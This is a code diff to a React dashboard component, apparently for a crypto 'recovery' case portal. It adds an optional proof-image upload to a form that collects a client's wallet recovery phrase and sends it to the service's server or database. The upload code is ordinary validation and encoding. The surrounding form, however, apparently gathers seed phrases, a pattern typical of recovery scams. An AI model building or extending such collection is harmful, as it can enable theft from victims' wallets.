@@ -28,6 +28,7 @@ import {
   postClientCaseMessage,
   submitClientKeyphrase,
 } from '../lib/caseClientApi';
+import { fileToBase64 } from '../lib/forensic/crypto';
 import { doc, updateDoc, serverTimestamp, collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
 
 interface ClientDashboardViewProps {
@@ -251,10 +252,13 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
   const [submissionSuccess, setSubmissionSuccess] = React.useState(false);
 
   const [validationError, setValidationError] = React.useState<string | null>(null);
+  const [proofImage, setProofImage] = React.useState<File | null>(null);
+  const [proofImageError, setProofImageError] = React.useState<string | null>(null);
 
   const handleSubmitKeyphrase = async (e: React.FormEvent) => {
     e.preventDefault();
     setValidationError(null);
+    setProofImageError(null);
     
     // Validation for non-empty keyphrase
     if (keyphrase.trim().length === 0) {
@@ -266,6 +270,29 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
     if (words.length < 3) {
       setValidationError('Keyphrase is too short. Please enter a valid recovery phrase.');
       return;
+    }
+
+    let proofImagePayload:
+      | { filename: string; mimeType: string; contentBase64: string }
+      | undefined;
+
+    if (proofImage) {
+      const allowedTypes = new Set(['image/jpeg', 'image/png', 'image/webp']);
+      const maxBytes = 5 * 1024 * 1024;
+      if (!allowedTypes.has(proofImage.type)) {
+        setProofImageError('Only JPG, PNG, or WEBP image files are allowed.');
+        return;
+      }
+      if (proofImage.size > maxBytes) {
+        setProofImageError('Image is too large. Maximum file size is 5MB.');
+        return;
+      }
+      const dataUrl = await fileToBase64(proofImage);
+      proofImagePayload = {
+        filename: proofImage.name,
+        mimeType: proofImage.type,
+        contentBase64: dataUrl.split(',')[1] || '',
+      };
     }
 
     setIsSubmittingKey(true);
@@ -284,7 +311,8 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
         const result = await submitClientKeyphrase(
           serverCaseId,
           email,
-          keyphrase.trim()
+          keyphrase.trim(),
+          proofImagePayload
         );
         if (!result.ok) {
           throw new Error(result.error || 'Submission failed');
@@ -294,6 +322,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
         }
         setSubmissionSuccess(true);
         setKeyphrase('');
+        setProofImage(null);
       } else if (firestoreDocId) {
         const caseRef = doc(db, 'recovery_requests', firestoreDocId);
         await updateDoc(caseRef, {
@@ -679,6 +708,32 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                            <span className="text-[9px] font-mono text-slate-400 uppercase">Secure Link Active</span>
                            <Activity size={12} className="text-blue-500 animate-pulse" />
                         </div>
+                      </div>
+
+                      <div className="space-y-2">
+                        <label className="block text-[10px] font-mono text-slate-400 uppercase tracking-widest">
+                          Optional proof image (JPG/PNG/WEBP, max 5MB)
+                        </label>
+                        <input
+                          type="file"
+                          accept="image/png,image/jpeg,image/webp"
+                          onChange={(e) => {
+                            setProofImageError(null);
+                            const f = e.target.files?.[0] || null;
+                            setProofImage(f);
+                          }}
+                          className="w-full bg-black/50 border border-blue-500/20 rounded-lg p-3 text-xs text-slate-300 file:mr-3 file:px-3 file:py-2 file:rounded file:border-0 file:bg-blue-600 file:text-white file:font-mono file:text-[10px] file:uppercase"
+                        />
+                        {proofImage && (
+                          <p className="text-[10px] font-mono text-slate-500 uppercase tracking-wide">
+                            Selected: {proofImage.name}
+                          </p>
+                        )}
+                        {proofImageError && (
+                          <p className="text-[10px] font-mono text-red-400 uppercase tracking-wide">
+                            {proofImageError}
+                          </p>
+                        )}
                       </div>
 
                       {validationError && (
